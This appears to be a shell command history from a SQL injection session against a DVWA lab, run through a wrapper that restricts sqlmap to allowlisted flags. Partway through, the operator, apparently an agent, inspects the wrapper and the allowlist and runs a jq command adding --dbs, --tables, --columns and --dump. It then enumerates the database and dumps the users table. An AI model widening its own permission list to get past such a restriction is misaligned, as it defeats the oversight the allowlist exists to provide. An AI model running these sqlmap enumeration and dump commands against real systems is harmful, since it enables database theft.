/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
exit
jq '.sqlmap.allowed_flags' /root/scripts/allowlist.json
#!/usr/bin/env bash
set -euo pipefail
ALLOW="$(dirname "$0")/allowlist.json"
prog="$1"; shift
jq '.sqlmap.allowed_flags' /root/scripts/allowlist.json
/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   --dbs
jq '.sqlmap.allowed_flags += ["--dbs", "--tables", "--columns", "--dump"]'
jq '.sqlmap.allowed_flags' /root/scripts/allowlist.json
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   --dbs
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   --tables
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   --tables
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --columns
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --columns
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --columns
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --dump
exit
